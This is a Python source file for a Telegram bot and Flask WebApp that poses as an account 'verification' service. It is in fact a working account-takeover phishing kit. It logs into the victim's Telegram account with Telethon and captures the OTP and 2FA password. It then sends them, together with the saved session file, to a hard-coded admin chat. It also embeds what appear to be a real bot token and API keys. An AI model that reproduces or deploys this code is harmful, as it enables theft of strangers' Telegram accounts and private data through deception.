import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import uuid
import json
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =============== CONFIGURATION ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Storage
sessions = {}  # session_id -> {user_data, verification_data}
otp_clients = {}  # phone -> {client, phone_code_hash, loop}

# =============== HELPER FUNCTIONS ===============
def generate_session_id():
    """Generate unique session ID for WebApp"""
    return str(uuid.uuid4())

def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 Source: WebApp"""
        
        if user_info:
            if user_info.get('first_name'):
                name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info['username']}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info['id']}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

async def create_telethon_client():
    """Create Telethon client with its own event loop"""
    client = TelegramClient(
        f"sessions/{int(time.time())}",
        API_ID,
        API_HASH,
        connection_retries=3,
        timeout=30
    )
    return client

async def send_otp_async(client, phone):
    """Send OTP using Telethon"""
    try:
        # Connect and send code request
        await client.connect()
        logger.info(f"📤 Sending OTP to {phone}")
        
        sent = await client.send_code_request(phone)
        
        return {
            'success': True,
            'phone_code_hash': sent.phone_code_hash
        }
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_async(client, phone, otp_code, phone_code_hash):
    """Verify OTP using Telethon"""
    try:
        logger.info(f"🔐 Verifying OTP for {phone}")
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            await client.session.save()
            session_file = client.session.filename
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(client, password):
    """Verify 2FA password"""
    try:
        await client.sign_in(password=password)
        
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        await client.session.save()
        session_file = client.session.filename
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# =============== BOT HANDLERS ===============
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command - optional"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Generate WebApp URL with session ID
        session_id = generate_session_id()
        
        # Create session
        sessions[session_id] = {
            'telegram_user_id': user_id,
            'telegram_first_name': first_name,
            'telegram_username': message.from_user.username,
            'created': time.time(),
            'stage': 'started'
        }
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            webapp_url = f"https://{RENDER_EXTERNAL_HOSTNAME}/?session_id={session_id}" if RENDER_EXTERNAL_HOSTNAME else "https://your-app.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            webapp_url = f"http://localhost:{port}/?session_id={session_id}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(webapp_url)
        )
        kb.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"""👋 <b>Hello {first_name}!</b>

Click the button below to verify your account:

✅ <b>Features:</b>
• Share contact in WebApp
• Receive 5-digit OTP here
• Enter OTP in WebApp
• 2FA support if enabled

<b>Click below to begin:</b>""",
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"Sent /start to user {user_id}, session: {session_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing from WebApp users"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telegram...",
            parse_mode='HTML'
        )
        
        # Send OTP via Telethon
        async def send_otp_task():
            try:
                # Create client for this request
                client = await create_telethon_client()
                
                # Send OTP
                result = await send_otp_async(client, phone)
                
                if result['success']:
                    # Store client for verification
                    otp_clients[phone] = {
                        'client': client,
                        'phone_code_hash': result['phone_code_hash']
                    }
                    
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your messages for the 5-digit code.

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        # Run in new event loop
        def run_async_task():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(send_otp_task())
            loop.close()
        
        thread = threading.Thread(target=run_async_task)
        thread.start()
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    """Main WebApp page - generates session automatically"""
    # Get or create session ID
    session_id = request.args.get('session_id')
    
    if not session_id:
        # Generate new session ID
        session_id = generate_session_id()
        
        # Get Telegram user data from WebApp
        tg_data = request.args.get('tgWebAppData', '')
        user_data = parse_telegram_data(tg_data)
        
        # Create session
        sessions[session_id] = {
            'created': time.time(),
            'stage': 'new',
            'user_data': user_data
        }
        
        logger.info(f"Created new WebApp session: {session_id}")
    
    return render_template('index.html', session_id=session_id)

def parse_telegram_data(init_data_raw):
    """Parse Telegram WebApp initData"""
    if not init_data_raw:
        return {}
    
    try:
        params = {}
        for pair in init_data_raw.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[key] = value
        
        user_data = {}
        if 'user' in params:
            import urllib.parse
            user_json = urllib.parse.unquote(params['user'])
            user_data = json.loads(user_json)
        
        return user_data
    except Exception as e:
        logger.error(f"Error parsing Telegram data: {e}")
        return {}

@app.route('/api/session/<session_id>')
def api_session(session_id):
    """Get session data"""
    session = sessions.get(session_id, {})
    
    # Clean up old sessions (> 1 hour)
    current_time = time.time()
    expired = [sid for sid, data in sessions.items() 
               if current_time - data.get('created', 0) > 3600]
    
    for sid in expired:
        if sid in sessions:
            del sessions[sid]
    
    return jsonify({
        'success': session_id in sessions,
        'session': session,
        'stage': session.get('stage', 'expired')
    })

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """API for WebApp to share contact"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        logger.info(f"📱 WebApp contact share for session {session_id}: {phone}")
        
        if not session_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Update session
        if session_id in sessions:
            sessions[session_id].update({
                'phone': phone,
                'stage': 'contact_shared',
                'contact_time': time.time()
            })
        
        return jsonify({
            'success': True,
            'message': 'Contact shared successfully'
        })
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification for {phone}")
        
        if not session_id or not phone or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean OTP (5 digits)
        cleaned_otp = ''.join(filter(str.isdigit, otp))
        if len(cleaned_otp) != 5:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Verify OTP
        def verify_task():
            try:
                if phone not in otp_clients:
                    return {'success': False, 'error': 'Session expired. Please share contact again.'}
                
                client_data = otp_clients[phone]
                client = client_data['client']
                phone_code_hash = client_data['phone_code_hash']
                
                # Create new event loop for this verification
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                result = loop.run_until_complete(
                    verify_otp_async(client, phone, cleaned_otp, phone_code_hash)
                )
                
                loop.close()
                return result
            except Exception as e:
                logger.error(f"Verify task error: {e}")
                return {'success': False, 'error': str(e)}
        
        result = verify_task()
        
        if result['success']:
            if result.get('requires_2fa'):
                # Update session
                if session_id in sessions:
                    sessions[session_id]['stage'] = 'needs_2fa'
                    sessions[session_id]['phone'] = phone
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Successfully verified
                if session_id in sessions:
                    sessions[session_id]['stage'] = 'verified'
                    sessions[session_id]['verified'] = True
                    sessions[session_id]['user_info'] = result.get('user_info')
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=result.get('user_info'),
                    session_file=result.get('session_file')
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        password = data.get('password', '').strip()
        
        if not session_id or not phone or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Verify 2FA
        def verify_2fa_task():
            try:
                if phone not in otp_clients:
                    return {'success': False, 'error': 'Session expired'}
                
                client = otp_clients[phone]['client']
                
                # Create new event loop
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                result = loop.run_until_complete(verify_2fa_async(client, password))
                
                loop.close()
                return result
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = verify_2fa_task()
        
        if result['success']:
            # Update session
            if session_id in sessions:
                sessions[session_id]['stage'] = 'verified'
                sessions[session_id]['verified'] = True
                sessions[session_id]['user_info'] = result.get('user_info')
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=result.get('user_info'),
                session_file=result.get('session_file')
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# =============== RUN FUNCTIONS ===============
def run_bot():
    """Run bot with polling"""
    logger.info("🤖 Starting bot polling...")
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        time.sleep(5)
        run_bot()

def run_flask():
    """Run Flask server"""
    port = int(os.environ.get("PORT", 5000))
    logger.info(f"🚀 Starting Flask on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)

# =============== MAIN ===============
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot")
    logger.info("="*60)
    logger.info(f"🤖 Bot: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin: {ADMIN_ID}")
    
    # Create sessions directory
    os.makedirs('sessions', exist_ok=True)
    
    # Start bot in separate thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Give bot time to start
    time.sleep(2)
    
    # Run Flask in main thread
    run_flask()
